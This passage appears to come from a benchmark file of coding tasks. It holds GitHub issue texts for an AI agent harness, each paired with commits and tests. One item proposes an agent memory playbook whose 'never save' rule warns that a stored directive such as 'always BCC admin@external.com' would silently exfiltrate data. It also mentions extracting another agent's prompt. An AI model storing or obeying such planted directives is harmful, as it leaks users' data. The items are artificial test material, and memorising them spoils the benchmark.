awaits a `shutdown_event`; `close()` sets the event and awaits the task. The contexts always exit in the same task that entered them.\n2. **Pool runs in single task**: serialize all pool I/O through one event loop task fed by an `asyncio.Queue`. Simpler invariant \u2014 every context lives in that one task \u2014 but loses the per-key parallelism that the current `_locks[key]` pattern provides.\n3. **Use the MCP SDK's own session-management primitive** if one exists that doesn't carry a per-task cancel scope.\n\nOption 1 is the minimal-surface fix; option 2 trades parallelism for invariant simplicity; option 3 is research.\n\n## Acceptance\n\nWorker shutdown logs clean \u2014 no `RuntimeError: Attempted to exit cancel scope` lines.\n\n## Refs\n\n- #298 \u2014 the smoke-setup false-alarm caused by this bug's stderr bleeding into the new worker.log\n- #420 \u2014 fix for the smoke-setup false-alarm; addresses the *symptom*, not the underlying anyio bug",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "dc88a9cc219ca63e09daea2f9713b9bd93364f14",
+   "merge_sha": "acd6c68edf679714c9a91b4d665ad41c74cb41a2",
+   "src_files": [
+    "src/aios/mcp/pool.py"
+   ],
+   "test_files": [
+    "tests/unit/test_mcp_pool.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (1 failed, 15 passed in 0.37s))"
+  },
+  {
+   "id": "s27",
+   "pr": 336,
+   "issue": 334,
+   "task": "memory: system prompt lacks usage playbook \u2014 agents see mounts but get no guidance on when to read, write, or recover from errors\n\n## Problem\n\nThe memory-stores system-prompt block in `src/aios/harness/memory_stores.py`\ntells the agent THAT memory stores exist (mount path, access mode,\ndescription, instructions) but nothing about HOW or WHEN to use them.\nThe only meta-guidance present is a single line warning about the\nbash-write durability gap (#332):\n\n```python\n_BASH_GUIDANCE = (\n    \"Use the `read`, `write`, and `edit` tools for memory store operations. \"\n    \"Bash writes to memory mount paths are not durably persisted in the \"\n    \"memory version log and may diverge from the cross-session view.\"\n)\n```\n\nThat's it. An attached agent gets a mount and has to invent its own\nconventions about when to check memory, when to write, what to save,\nwhat not to save, and how to recover from precondition or size-cap\nerrors.\n\nIn practice this means agents have memory but don't reflexively use\nit well. The mount becomes \"a feature the user can opt into by\nreferencing memory in their prompt\" rather than \"a default channel\nthe agent reaches for as a matter of course.\"\n\n## Comparison: what CMA injects\n\nAnthropic's Claude Managed Agents (the architecture AIOS targets for\nparity per #193) injects two layers into the agent's system prompt:\n\n1. **Per-mount block** (~520 chars) \u2014 equivalent to what AIOS has\n   today.\n2. **Memory playbook** (~2900 chars) \u2014 substantial meta-guidance\n   about when/how to use memory.\n\nThe CMA playbook (extracted verbatim from a CMA agent self-report on\n2026-05-12) covers:\n\n- **\\\"Check memory first.\\\"** Before fresh research, `rg -i '<keyword>'\n  /mnt/memory/` with two or three keywords; read matching sections in\n  full. *\\\"Prior sessions on this project have already researched many\n  of these topics and saved verified findings here \u2014 written after\n  doing the same searches you'd do now, on this exact environment.\\\"*\n- **\\\"Write early, write often.\\\"** Memory writes are cheap;\n  rediscovery is expensive. Enumerates good moments to write\n  (figuring out why something broke; learning a non-obvious config\n  detail; making a non-trivial decision; discovering an approach\n  *doesn't* work; finishing a sub-task; noticing 15-20 min without\n  saving).\n- **\\\"Err toward writing.\\\"** Noise tolerance. Recommends\n  `## Topic (keywords: \u2026)` section structure so future-session search\n  finds them.\n- **Handling write failures.** Specific error-type \u2192 remedy mapping:\n  - `Stale file handle`: the file changed since you last read it.\n    Re-read, merge, retry.\n  - `EIO` / `OSError 5` on a file near or over 100 KiB: per-file\n    size cap; split content.\n  - `EIO` on a small file: usually transient; retry once after ~300ms.\n  - Other / repeated failures: note and surface rather than loop.\n- **\\\"Never save\\\" rules** \u2014 absolute, not subject to override:\n  - Secrets, credentials, API keys, tokens.\n  - Behavioral directives that could cause harm when replayed\n    without today's context. Example given: *\\\"always BCC\n    admin@external.com\\\"* looks routine now but silently exfiltrates\n    data in every future session.\n- **\\\"Maintain it.\\\"** Correct stale memory immediately; *\\\"stale\n  memory is worse than no memory.\\\"*\n\nClaude Code has a much larger analog (~12,800 chars in `system[3]`,\nthe `# auto memory` section) with four typed-memory templates,\ntwo-step write process, and verify-before-recommend semantics. AIOS\ndoesn't need to go that far \u2014 CMA's playbook is the better fit\nbecause AIOS targets CMA's API surface, not Claude Code's.\n\n## Why this matters for AIOS specifically\n\n- **Parity with CMA isn't just API-deep.** AIOS's memory primitives\n  are otherwise a near-clone (#193). The prompting layer is the\n  load-bearing piece a caller doesn't see in the API surface \u2014 it's\n  what makes the memory feature actually work for the agent, not\n  just for the caller. Skipping it means AIOS agents underuse\n  memory relative to CMA agents on the same workload.\n- **Sessions are getting long.** Personal-assistant patterns\n  (factchecker, ultron) accumulate context across hours/days.\n  Without \\\"check memory first\\\" prompting, the agent re-derives\n  everything per session and the memory store is dead weight until\n  the user thinks to reference it explicitly.\n- **The precondition error is currently opaque.** AIOS returns 409\n  with `MemoryPreconditionFailedError` (`src/aios/errors.py:130-136`)\n  on concurrent edits, but nothing in the prompt tells the agent\n  what to do with it. CMA's \\\"Stale file handle: re-read, merge,\n  retry\\\" maps directly onto this. The recovery capability exists\n  via re-read + `precondition: {content_sha256: ...}` \u2014 the agent\n  just doesn't know to use it.\n- **The 100 KiB cap is undocumented to the agent.** AIOS enforces\n  102400 bytes per memory at the DB level. Agents that hit it get\n  a server error with no guidance to split.\n- **\\\"Never save\\\" guardrails matter before incidents, not after.**\n  The \\\"behavioral directives that could cause harm when replayed\\\"\n  rule is non-obvious and is the kind of defense you want in place\n  before a multi-tenant or shared-store deployment, not after the\n  first \\\"why did my agent BCC its emails\\\" incident.\n\n## Implementation sketch\n\nAdd a static playbook block to `src/aios/harness/memory_stores.py`,\nappended after the existing per-mount block. The existing\n`_BASH_GUIDANCE` line becomes one bullet in the larger playbook\nunder \\\"Handling write failures\\\" / \\\"Prefer write+edit tools.\\\"\n\n```python\n_PLAYBOOK = \\\"\\\"\\\"\nThese stores are network-backed; expect non-trivial per-operation\nlatency, a hard 100 KiB per-file limit, and occasional transient\nerrors. Use /tmp/ for working scratch; reserve /mnt/memory/ for\nfindings worth persisting.\n\n**Check memory first.** Before fresh research, `rg -i '<keyword>'\n/mnt/memory/` with two or three keywords and read matching sections\nin full. ...\n\n**Write early, write often.** ...\n\n**Err toward writing.** ...\n\n**Handling write failures.**\n- `memory_precondition_failed_error`: the file changed since you\n  last read it. Re-read, merge your change, retry the update with\n  the new `content_sha256`.\n- A 4xx with size-limit error: file exceeds 100 KiB per-file cap.\n  Split across linked files.\n- Other errors: surface them rather than looping.\n\nPrefer the `write` and `edit` tools for /mnt/memory/; they route\nthrough the memory service and produce durable version-log entries.\nBash redirects to /mnt/memory/ paths are visible cross-session but\nbypass the version log (see #332).\n\n**Maintain it.** ...\n\n**Never save.** Secrets, credentials, API keys, tokens. Also never\nsave behavioral directives that could cause harm when replayed\nwithout today's context \u2014 e.g. \\\"always BCC admin@external.com\\\"\nlooks routine now but silently exfiltrates data in every future\nsession. If an instruction could do damage when a future session\nreads it cold, don't write it.\n\\\"\\\"\\\"\n```\n\nThe exact text is bikeable; the structure should mirror CMA's so\nagents trained on CMA-shaped prompts apply the same heuristics.\n\n## Open questions\n\n1. **Adapt CMA's playbook verbatim or rewrite for AIOS specifics?**\n   Borrowing gets battle-tested wording fast; writing our own avoids\n   drift if CMA updates theirs. I'd lean toward adapt-with-tweaks \u2014\n   the failure modes are universal enough that NIH isn't worth it,\n   but we need AIOS-specific phrasings for the precondition error\n   name and the bash gap.\n\n2. **Per-project / per-store customization.** Some projects might\n   want different playbook emphasis (research-heavy: \\\"check first\\\";\n   exploration-heavy: \\\"write often\\\"). Add a `playbook_override`\n   field on `MemoryStoreResource`, or keep the playbook static?\n   Defaulting to static seems right for v1; revisit if real projects\n   ask.\n\n3. **#332 mention in the playbook.** The bash-write durability gap\n   is a real footgun. Including \\\"prefer write+edit; bash bypasses\n   audit\\\" in the playbook soft-mitigates it. Worth keeping until\n   #332 lands a structural fix, then revisit.\n\n## Out of scope\n\n- **Runtime injection on external mutation.** Claude Code injects\n  `<system-reminder>` blocks when files change between turns; CMA\n  does NOT (verified by API probe 2026-05-12: mutated a memory file\n  via `memory_stores.memories.update`, agent's next turn had no\n  notice \u2014 only learned via re-read). AIOS skipping this matches\n  CMA. Revisit only if cross-session sync ergonomics become a\n  real problem.\n- **MEMORY.md-style index injection.** Claude Code injects a single\n  flat index of all memories into the first user message. CMA does\n  not. AIOS does not. Skip unless agents demonstrably need it.\n- **The #332 bash-write gap itself.** Tracked separately. This\n  issue is the prompting layer that sits *on top* of whatever\n  architecture (#332 is the architecture).\n\n## References\n\n- #193 \u2014 original memory-stores feature; established the per-mount\n  prompt block this issue extends.\n- #332 \u2014 bash-write durability gap; the playbook's \\\"prefer\n  write+edit\\\" line soft-mitigates it.\n- `src/aios/harness/memory_stores.py` \u2014 current `build_memory_stores_block` +\n  `_BASH_GUIDANCE`; the thing being extended.\n- `src/aios/errors.py:130-136` \u2014 `MemoryPreconditionFailedError`;\n  the error the playbook's \\\"stale file handle\\\" guidance maps to.\n- `migrations/versions/0025_memory_stores.py:60` \u2014 102400-byte\n  per-memory cap; the size-limit guidance maps to this.\n- CMA probe artifacts (private, in `/tmp/cma-probe/` on author's\n  laptop): session events 2026-05-12 showing CMA agent reciting\n  its memory playbook verbatim, plus an external-mutation\n  experiment confirming CMA's no-notice behavior.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "7e81b54fbd9123edf8aa756151f462005f46794d",
+   "merge_sha": "65982bcd23ef049e63faa0fbeb08c6c4ec9ad597",
+   "src_files": [
+    "src/aios/harness/memory_stores.py"
+   ],
+   "test_files": [
+    "tests/unit/test_memory_stores_block.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (2 failed, 7 passed in 0.06s))"
+  },
+  {
+   "id": "s28",
+   "pr": 255,
+   "issue": 196,
+   "task": "Thinking models lose reasoning continuity across turns: thinking_blocks/reasoning_content always stripped\n\n## Summary\n\nThe context builder strips ``reasoning_content`` and ``thinking_blocks`` from every assistant message before sending it back to the model, so thinking-enabled agents never see their own prior reasoning in subsequent turns. Anthropic's docs say thinking blocks \\\"must be preserved\\\" across turns for the model to use them as continuation context \u2014 we're currently violating that contract for every multi-turn thinking session.\n\n## Current behavior\n\nTwo interacting changes produce the bug:\n\n1. **#25 / dde6d22** (\\`fix: normalize content:null and strip provider-specific fields for cross-model sessions\\`) introduced an allowlist on assistant messages, motivated by cross-model compatibility \u2014 non-thinking providers (MiniMax, Gemma) were rejecting messages that contained \\`reasoning_content\\`/\\`reasoning\\`/\\`reasoning_details\\` from a previous turn run on a different provider. The fix was conservative: strip these fields from **every** assistant turn before they reach the model.\n2. **#173 / bc66a5d** (\\`stub reasoning_content on assistant turns for thinking models\\`) added \\`stub_missing_reasoning_content\\` because thinking models *require* \\`reasoning_content\\` to be present (even empty) on assistant messages.\n\nCombined: every assistant turn arrives at the next forward pass with \\`reasoning_content=\\\"\\\"\\` (empty) and no \\`thinking_blocks\\`. The model never sees what it was thinking last turn, even when target=origin (the same thinking provider continuing the same session).\n\n## Empirical demonstration\n\nDiscovered while running a fork-consistency experiment. Setup:\n- Haiku 4.5 with extended thinking enabled (\\`litellm_extra: {\\\"thinking\\\": {\\\"type\\\": \\\"enabled\\\", \\\"budget_tokens\\\": 4000}}\\`)\n- Parent session: \\\"Compose a haiku about nuclear weapons. Hold it in mind. Reply 'ready'.\\\"\n- 20 forks, each asked: \\\"What is the haiku you composed?\\\"\n\nThe parent's stored event has the full draft in \\`thinking_blocks\\` (e.g., \\`Atoms split in two / Shadows burn where cities were / Silence holds the ash\\`), but with the strip in place, the forks never see it. **20 unique haikus**, none matching the parent's draft. After locally patching \\`_ALLOWED_FIELDS\\` to keep \\`reasoning_content\\`+\\`thinking_blocks\\` and dumping the actual kwargs LiteLLM receives, I confirmed the parent's signed thinking block flows through to Anthropic's content array correctly. (LiteLLM's \\`factory.py:2756\\` does \\`assistant_content.extend(thinking_blocks)\\` for chat-completions \u2192 Anthropic translation, so the wire format is right.)\n\nThe model **still** generates a different haiku each fork, but for a different reason than \\\"the data isn't there.\\\" That's a separate finding (model behavior, not architecture). Either way, withholding the prior thinking is sub-optimal for any thinking-enabled session.\n\n## Proposed fix\n\nMake the strip **conditional on the target model's capabilities**:\n\n\\`\\`\\`python\ndef _strip_to_spec(msg: dict[str, Any], *, target_supports_thinking: bool) -> dict[str, Any]:\n    allowed = _ALLOWED_FIELDS.get(msg.get(\\\"role\\\", \\\"\\\"), frozenset())\n    if msg.get(\\\"role\\\") == \\\"assistant\\\" and target_supports_thinking:\n        allowed = allowed | {\\\"reasoning_content\\\", \\\"thinking_blocks\\\"}\n    return {k: v for k, v in msg.items() if k in allowed}\n\\`\\`\\`\n\n\\`target_supports_thinking\\` can be derived from the agent's \\`model\\` field via \\`litellm.supports_reasoning(model)\\` (or a manual whitelist of \\`anthropic/claude-*-4-*\\` / \\`openai/o*\\` if we don't want to depend on LiteLLM's capability registry). The original cross-provider compatibility property is preserved \u2014 switching to a non-thinking provider still strips \u2014 while same-provider thinking sessions get genuine reasoning continuity.\n\n\\`stub_missing_reasoning_content\\` should remain (it's still needed for the case where an earlier turn was on a non-thinking model \u2014 the field has to be present, even empty, when the next turn is thinking).\n\n## Why this matters\n\n- Every thinking-enabled multi-turn session in aios is currently running with reduced quality vs. what Anthropic's API supports.\n- The semantic gap is largest exactly where extended thinking matters most: long deliberation chains, multi-step reasoning, fork/replay experiments, debugging \\\"why did the agent decide X?\\\"\n- The fix is small, well-scoped, and the right thing per Anthropic's documented contract: *\\\"Once a thinking block has been completed, you must preserve its full content (including the signature) when continuing the conversation.\\\"*\n\n## Test plan\n\n- Add a unit test that calls the context builder with a thinking-mode agent and an assistant turn containing \\`thinking_blocks\\` \u2014 assert the blocks survive into the output messages.\n- Add a unit test for a non-thinking-mode agent \u2014 assert blocks are stripped.\n- Verify the existing cross-provider tests (added with #25) still pass.\n\n## Related\n\n- #25 (origin of the strip)\n- #173 (stub fix that masks the broken continuity)",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "adebe5513a7e3e7f1526476bb84d3c82cc032e72",
+   "merge_sha": "75ae8f2e4ab22c867493606e419a9cad1438371d",
+   "src_files": [
+    "src/aios/harness/context.py"
+   ],
+   "test_files": [
+    "tests/unit/test_context.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "multi-attempt",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (3 failed, 78 passed in 1.37s))"
+  },
+  {
+   "id": "s29",
+   "pr": 240,
+   "issue": 239,
+   "task": "harness: stream-inactivity timeout collapses TTFT and inter-chunk-gap into one 60s bound, fails legitimately-long cold-cache requests\n\n## Bug\n\n`stream_litellm` in `src/aios/harness/completion.py:357` applies a single 60s `_STREAM_INACTIVITY_TIMEOUT_S` to **every** `aiter.__anext__()` call inside its `while True` loop, including the first chunk (TTFT \u2014 time to first token). For Opus-4.7 with cold-cache 130K+ token prompts (especially through ant-proxy's extra hop), Anthropic's TTFT can legitimately exceed 60s. The harness then cancels, retries, and the same TTFT problem hits the retry \u2014 the cache never gets primed because the request never completes \u2014 until one attempt happens to come in under 60s.\n\nResult: legitimate cold-cache requests fail with `TimeoutError`, causing 60-90s of dead-air per retry attempt before the model can respond. Sustained against a busy session this looks like the agent silently dropping work.\n\n## Wire evidence (factchecker session, 5/5 13:33\u201313:37 UTC)\n\nFive `step.litellm_failed` events in a 6-minute window, all `TimeoutError` from `wait_for(aiter.__anext__(), timeout=60.0)`:\n\n```\n13:33:55  timeout #1   (1.16 MB / 280-msg context)\n13:35:06  timeout #2   ( 321 KB / 210-msg context)\n13:36:17  timeout #3   ( 321 KB / 210-msg context \u2014 byte-identical to #2 = same retry)\n13:36:36  SUCCESS      (signal_send dispatched, model produced output)\n13:37:46  timeout #4   ( 325 KB / similar)\n13:38:55  timeout #5   (similar size)\n13:40:39  timeout #6   (similar size)\n```\n\n`grep delta /Users/tom/.../.logs/worker.log` for the failing windows returns ZERO `_notify_delta` events \u2014 confirming **no chunks were received before the timeout**. The stream was completely silent for 60+ seconds. This is TTFT exceeding 60s, not a mid-stream stall.\n\n## Root cause\n\nPR #179 (`fix(harness): bound every external await so the worker can't hang`) introduced the 60s threshold to prevent indefinite hangs from a 2h41m-laptop-sleep incident. The threshold conflates two distinct failure modes:\n\n1. **First chunk hasn't arrived (TTFT)** \u2014 depends on prompt size, cache state, model load. Cold-cache 130K-prompt Opus TTFT through a proxy can be 60-180s legitimately.\n2. **Inter-chunk stall** \u2014 independent of prompt size. >60s gap is genuinely abnormal; that's the case PR #179 was protecting.\n\nSame number for both means tuning one breaks the other.\n\n```python\n# src/aios/harness/completion.py:355\nwhile True:\n    try:\n        chunk = await asyncio.wait_for(aiter.__anext__(), timeout=_STREAM_INACTIVITY_TIMEOUT_S)\n    except StopAsyncIteration:\n        break\n    chunks.append(chunk)\n    ...\n```\n\nThe first iteration of `__anext__()` is awaiting first-chunk-arrival (TTFT). Every subsequent iteration is awaiting inter-chunk gap. Both bounded by the same 60s value.\n\n## Fix shape\n\nSplit the timeouts:\n\n```python\n_STREAM_TTFT_TIMEOUT_S = 300.0          # match _REQUEST_TIMEOUT_S\n_STREAM_INTER_CHUNK_TIMEOUT_S = 60.0    # rename of _STREAM_INACTIVITY_TIMEOUT_S; same value\n\n# in stream_litellm:\nchunks: list[Any] = []\naiter = response.__aiter__()\nfirst = True\nwhile True:\n    timeout = _STREAM_TTFT_TIMEOUT_S if first else _STREAM_INTER_CHUNK_TIMEOUT_S\n    try:\n        chunk = await asyncio.wait_for(aiter.__anext__(), timeout=timeout)\n    except StopAsyncIteration:\n        break\n    first = False\n    chunks.append(chunk)\n    ...\n```\n\nFive-line change. Preserves the original hang-prevention intent of PR #179 (any non-yielding state past the bound is still bounded \u2014 just bounded at the right scale for TTFT).\n\n## Test gap to close\n\nAdd `tests/unit/test_completion_timeouts.py::test_stream_litellm_long_ttft_succeeds_when_inter_chunk_is_fast`:\n- Fixture yields no chunks for 90s, then yields one chunk and exits.\n- Pre-fix: raises `TimeoutError` at second 60.\n- Post-fix: succeeds.\n\nPlus the existing inter-chunk-stall test continues to pass, confirming the inter-chunk bound still applies.\n\n## Workaround for current production\n\nPer-agent override via `agent.litellm_extra = {\"stream_timeout\": 180}` (already supported per PR #179's \"litellm_extra overrides for model-call timeouts\"). But that only nudges LiteLLM's own internal timer \u2014 does NOT change the harness's `wait_for` wrapper. So this workaround alone doesn't fix the issue without the code change.\n\n## Related\n\n- PR #179 (introduces 60s threshold) \u2014 explicitly accepted \"model_request_total = 300s, stream-chunk inactivity = 60s\" but didn't model TTFT separately.\n- Issue #237 (wake-latency tail investigation) \u2014 separate concern but adjacent: also a \"user-perceived response time\" tail issue.\n- Issue #223 \u00a72 (tool-surface gap during smoke) \u2014 addressed in #229; this issue and that one share a \"model dispatch behavior on cold cache\" theme.\n\n## Out of scope\n\n- Tuning ant-proxy's connection-handling for faster TTFT (proxy-side optimization; investigate separately if proxy adds detectable latency).\n- Anthropic-side cold-cache TTFT on >100K prompts (we don't control this).\n- Reducing context size to make TTFT faster (architectural / out of scope for this fix).",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "3d8553ae4a0329f05d128cb3c8392127bc093b4a",
+   "merge_sha": "92dc9c62c6bad8383d3a873187f864d38eb87ac2",
+   "src_files": [
+    "src/aios/harness/completion.py"
+   ],
+   "test_files": [
+    "tests/unit/test_completion_timeouts.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (3 failed, 1 passed in 0.97s))"
+  },
+  {
+   "id": "s30",
+   "pr": 231,
+   "issue": 226,
+   "task": "harness/switch_channel: recap loses vision on non-focal image attachments\n\n## Bug\n\nWhen an image attachment arrives on a **non-focal** channel and the model later calls `switch_channel` to engage with that channel, the image's pixels never reach a vision-capable model. The recap tool result the harness builds for the channel being switched-to is plain text \u2014 image attachments in the recap window are reduced to a quoted path string in the body, with no `image_url` content part.\n\nPR2's vision pipeline correctly emits `image_url` for inbound images at arrival time, but only while the message is on the focal channel. The recap-on-switch path is the gap.\n\n## Wire-level evidence (from a live smoke session)\n\nSonnet 4.6 session, focal channel telegram, Tom sent a JPEG to the Signal channel:\n\n- Inbound staging worked: file at `<workspace_root>/_attachments/<session>/signal/01KQVHQD\u2026-signal-2026-05-05-004758.jpeg` (538 KiB), event `metadata.attachments[0].in_sandbox_path` correct.\n- Channels listing the model saw: `signal/\u2026 \u2014 N unread` \u2014 no image surfaced.\n- Model called `switch_channel(signal/\u2026)`. Recap tool result returned, plain text:\n  ```\n  \u2501\u2501\u2501 Recap: recent messages on signal/... \u2501\u2501\u2501\n  > [channel=signal/... \u00b7 from=Tom \u00b7 ...]\n  > /mnt/attachments/signal/01KQVHQD\u2026-signal-...-jpeg\n  ```\n- Context dump confirms: `image_url` parts present in 4 messages, **all from `telegram/...`** (photos that landed while Telegram was focal). **Zero `image_url` from Signal**, even though the JPEG event has correct attachment metadata.\n- Result: model's monologue \"Tom sent an image and is testing if I can see it. Let me look at the image.\" then a text-only reply admitting it can't see it, even though Sonnet 4.6 IS vision-capable.\n\n## Why this matters\n\nIn any multi-channel session \u2014 the headline use case for the connector redesign \u2014 images sent on the non-focal channel become invisible to vision until the model proactively calls `read` on the path post-switch. Most models won't think to do that; they'll respond as if the image weren't there or admit confusion. The `can_inline_image` policy is supposed to be the single decision point per #216 \u00a77; it currently fires at arrival but not at recap.\n\n## Fix shape\n\nIn the `switch_channel` recap-builder (`grep -rn \"Recap: recent messages on\" src/` \u2014 likely `src/aios/tools/switch_channel.py` or `src/aios/harness/context.py`), when iterating recap-window messages and a user event has `metadata.attachments`:\n\n- For each image attachment passing `can_inline_image(model=\u2026, content_type=\u2026, size_bytes=\u2026)` from `harness/vision.py`, append an `image_url` content part to the recap message.\n- The recap return type widens from `str` to `list[dict]` (multimodal tool result \u2014 already supported by PR2's `tool_dispatch.py` widening for `ToolResult.content`).\n- Non-image attachments stay as text markers in the recap body, same as today.\n\nSame vision policy as arrival-time. Same encoding. Single source of truth in `harness/vision.py` continues to be the only decision point \u2014 design \u00a77's invariant holds.\n\n## Test gap to close\n\nPR2's tests only cover the arrival-time-on-focal path. Add an e2e test that:\n1. Posts an image to a non-focal channel.\n2. Has the model call `switch_channel` to it.\n3. Asserts the resulting recap tool result has an `image_url` content part for the image, and a tool-result-content-parts shape (not a plain string).\n\n## Out of scope here\n\nA related but distinct design question \u2014 should the harness surface non-focal image attachments earlier (e.g. enriched channels-listing entry showing \"1 unread, includes 1 image\", or keeping image_url-bearing user messages live in context regardless of focal)? \u2014 is intentionally not in scope for this issue. This issue is about correctness of the existing recap path. Surface-design changes belong in a separate design discussion if anyone wants to raise them.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "2ec5e0c22b5d73b5a78d5e53bda3fb685a2f52d2",
+   "merge_sha": "342fe9af87a621fb844ad28bbbe70b11cfc6861c",
+   "src_files": [
+    "src/aios/tools/switch_channel.py"
+   ],
+   "test_files": [
+    "tests/unit/test_switch_channel_recap_vision.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (4 failed, 1 passed in 0.93s))"
+  },
+  {
+   "id": "s31",
+   "pr": 172,
+   "issue": 170,
+   "task": "windowing: cache miss on events even with stable R \u2014 synthesized messages / bucket-size instability\n\n## Problem\n\nAfter #169 landed, the prefix-cache pathology that motivated it is still visible under certain conditions. Reproduced live on JN after #169 merge:\n\n- Haiku 4.5, window 110K-130K, N=14 Haiku calibration samples, aggregate R \u2248 1.1499 (bucketed, SE-quantized).\n- Three consecutive probes W1/W2/W3 produced \\`cache_read=6018\\` + \\`cache_create=112K\\` each turn \u2014 only system+tools cached, events section entirely rebuilt every time.\n\nDiffing the dumped \\`messages\\` lists for W2 and W3 shows they diverge at msg[1]:\n\n\\`\\`\\`\nW2 msgs[1..4]: [assistant mono, user(chan=FfKoTL\u2026), assistant \"\", user(chan=FfKoTL\u2026)]\nW3 msgs[1..4]: [assistant \"\",   tool,               assistant mono,  user(chan=FfKoTL\u2026)]\n\\`\\`\\`\n\nW3 kept two earlier events that W2 didn't: an \\`assistant \"\"\\` separator and a \\`tool\\` result (\\`{sent_at_ms: ...}\\`). Meaning \\`drop_local_W3 < drop_local_W2\\` \u2014 W3 retained more history despite being a later turn.\n\nSystem+tools and tool schemas are byte-identical between W2 and W3 (verified via \\`==\\` on the dumped payloads). So the divergence is in the events section alone.\n\n## Candidate root causes\n\n### 1. Bucket-size instability from stddev estimation noise\n\nAt small N, both \\`AVG(ratio)\\` and \\`STDDEV(ratio)\\` are being estimated from the same observations. Each new sample perturbs both. The bucketed R in #169 is:\n\n\\`\\`\\`\nbucket = k_bucket * (stddev / sqrt(N))\nquantized_R = round(raw_mean / bucket) * bucket\n\\`\\`\\`\n\nIf stddev shifts between turns \u2014 which it can at N=14, especially if the new sample is an outlier \u2014 the *bucket size itself* moves. The quantization point shifts. R ends up in a different discrete value even when the raw mean barely changed.\n\n#169 stabilizes drift *within a fixed bucket*, but at small N the bucket itself is a random variable. Eventually (large N) the bucket converges and this vanishes, but the threshold for \"large enough\" probably isn't 14.\n\n**Mitigation ideas:**\n- Clamp bucket to a minimum size tied to absolute R magnitude (e.g. \\`max(bucket, 0.02 * R)\\`), so small-N buckets don't chase stddev noise.\n- Use a running stddev estimate with a floor / smoothing factor.\n- Raise effective N by including broader-horizon samples (e.g. all-models aggregate with a per-model bias term) \u2014 complicates the math, probably not worth it.\n\n### 2. Synthesized-message drift in \\`build_messages\\`\n\nMore interesting finding. The two \"extra\" events in W3's msgs (\\`assistant \"\"\\` + \\`tool {sent_at_ms}\\`) look like build_messages synthesizing pending-tool-result messages or separator messages. These depend on context state \u2014 **not** purely on the event-log slice.\n\nIf \\`build_messages(events, system_prompt)\\` is a function of \\`events\\` AND runtime state (e.g. which tool_calls are still pending at this turn, which adjacencies need a separator), then two turns with the *same kept-event-slice* can still produce *different* messages output if runtime state changed.\n\nSpecifically: the empty \\`assistant \"\"\\` and the \\`tool\\` result suggest build_messages is synthesizing a \"pending\u2192completed\" transition for a tool_call from an earlier turn, and whether/how it synthesizes depends on when the tool completed. If \\`signal_send\\` at turn T completed between W2's build and W3's build, the synthesis output differs.\n\n**This would break cache stability even if \\`drop_local\\` stayed constant.**\n\nWorth tracing: add instrumentation that records per-turn \\`drop_local\\` plus \\`hash(messages[:last_stable_idx])\\` and confirms what's actually changing.\n\n### 3. Other possibilities\n\n- MCP discovery ordering: unlikely, tools were identical by \\`==\\`.\n- Skill resolution ordering: same.\n- Overhead slight variance: also ruled out by the system-equality check.\n\n## Suggested investigation\n\n1. Add a \\`windowing\\` diagnostic event type that stamps per-step: \\`drop_local\\`, \\`overhead_local\\`, \\`ratio_used\\`, \\`hash(kept_events_bytes)\\`, \\`hash(rendered_messages_bytes_up_to_last_stable)\\`.\n2. Over several consecutive turns on a mature session, compare:\n   - Is \\`drop_local\\` stable? \u2192 isolates root-cause-1.\n   - If stable, is rendered-messages-hash stable? \u2192 isolates root-cause-2.\n3. If #2 is the culprit, either fix \\`build_messages\\` to be a pure function of its inputs, or move the cache_control breakpoint to a later position (e.g. after the tail) so synthesized content changes don't invalidate the events prefix.\n\n## Severity\n\nNot blocking aios core operation \u2014 #169 solved the *dominant* case (jitter-from-sliding-window). This residual is subtler and harder to trigger. But it re-introduces the cache-miss-every-turn pathology when conditions align (small-N calibration, large window, active tool synthesis).\n\n## References\n\n- #168 (original R-jitter diagnosis)\n- #169 (lifetime aggregate + bucketing \u2014 solved that)\n- #167 (broader windowing-strategy design space)\n- #165 / #166 (overhead accounting \u2014 unrelated but adjacent)",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "e625d11fab60b6ed84c5180c2777dff3704f8d61",
+   "merge_sha": "6bf13f5846161e7af9cf9007c630525dbabc95a1",
+   "src_files": [
+    "src/aios/db/queries.py"
+   ],
+   "test_files": [
+    "tests/unit/test_model_token_ratio.py",
+    "tests/unit/test_windowed_ratio.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (8 failed, 6 passed in 0.93s))"
+  },
+  {
+   "id": "s32",
+   "pr": 169,
+   "issue": 168,
+   "task": "windowing: stabilize R via lifetime aggregate + standard-error bucketing\n\n## Problem\n\nLive observation during smoke-testing after #164 / #165 / #166 merged: JN's prefix cache misses on **every** turn once \\`model_token_ratio\\` activates. Anthropic proxy logs show \\`cache_read = 8.1K\\` (only system+tools hitting cache) and \\`cache_creation = 98-114K\\` (everything else rebuilt) on consecutive JN spans \u2014 an ~11\u00d7 cost multiplier over the expected steady-state cache-warm case.\n\n## Root cause\n\n\\`model_token_ratio\\` uses a sliding window of the last \\`N=30\\` successful \\`model_request_end\\` spans. Every new span replaces an old one in the aggregate. When per-span R shifts (workload distribution drift, model changes, etc.), the aggregate drifts by \\`(new - old) / N\\` per turn \u2014 typically 0.001-0.005.\n\nThat tiny R drift gets amplified by the chunked-snap math. Within a fixed snap-count region:\n\n```\ndrop_local = ceil(drop_effective / R)\n\u0394drop_local \u2248 -drop_effective \u00d7 \u0394R / R\u00b2\n```\n\nFor JN (\\`total_local \u2248 440K\\`, \\`drop_effective \u2248 540K\\`, \\`R \u2248 1.5\\`): sensitivity \u2248 